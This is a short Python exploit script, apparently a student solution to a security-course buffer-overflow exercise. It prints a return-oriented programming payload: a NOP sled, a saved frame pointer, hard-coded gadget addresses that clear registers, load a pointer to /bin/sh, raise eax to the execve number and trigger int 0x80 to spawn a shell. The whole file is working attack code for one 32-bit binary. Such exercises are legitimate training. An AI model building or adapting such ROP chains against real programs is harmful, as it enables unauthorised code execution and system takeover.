#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# The strategy is try to get 11 into eax, pointer to /bin/sh into ebx and NULL into ecx and ebx

sys.stdout.buffer.write(b"\x90"*100)

sys.stdout.buffer.write(pack("<I",0xfffeb534)) #keep ebp same

sys.stdout.buffer.write(pack("<I",0x805c363)) #get NULL into edx and eax 
sys.stdout.buffer.write(pack("<I",0xffffffff)) 
sys.stdout.buffer.write(pack("<I", 0xffffffff)) 
sys.stdout.buffer.write(pack("<I", 0xffffffff))



sys.stdout.buffer.write(pack("<I",0x8049a03)) # get NULL into ecx, eax and get address of /bin/sh into ebx
sys.stdout.buffer.write(pack("<I",0xfffeb580)) # pointer to /bin/sh
sys.stdout.buffer.write(pack("<I",0xffffffff)) 
sys.stdout.buffer.write(pack("<I", 0xffffffff))
sys.stdout.buffer.write(pack("<I",0xffffffff))

sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax
sys.stdout.buffer.write(pack("<I", 0x807b2ea)) #increment eax

sys.stdout.buffer.write(pack("<I", 0x806e780)) #int $0x80 to launch shell
sys.stdout.buffer.write(b"/bin/sh")